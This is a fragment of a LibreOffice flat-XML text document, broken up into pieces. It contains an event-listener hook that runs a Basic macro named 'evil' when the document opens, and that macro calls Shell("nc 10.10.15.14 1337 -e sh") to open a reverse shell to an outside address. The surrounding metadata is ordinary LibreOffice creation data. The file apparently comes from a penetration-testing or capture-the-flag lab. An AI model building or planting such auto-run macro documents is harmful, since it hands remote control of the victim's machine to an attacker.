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test.evil?language=Basic&amp;location=document" xlink:type="simple"/>
    </office:event-listeners>
  </office:scripts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47b07" officeooo:paragraph-rsid="00147b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k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7:56:07.412195613</meta:creation-date>
    <meta:generator>LibreOffice/7.5.5.2$Linux_X86_64 LibreOffice_project/ca8fe7424262805f223b9a2334bc7181abbcbf5e</meta:generator>
    <dc:date>2023-07-29T18:13:56.842979120</dc:date>
    <meta:editing-duration>PT11M51S</meta:editing-duration>
    <meta:editing-cycles>5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evil

    Shell("nc 10.10.15.14 1337 -e sh")
    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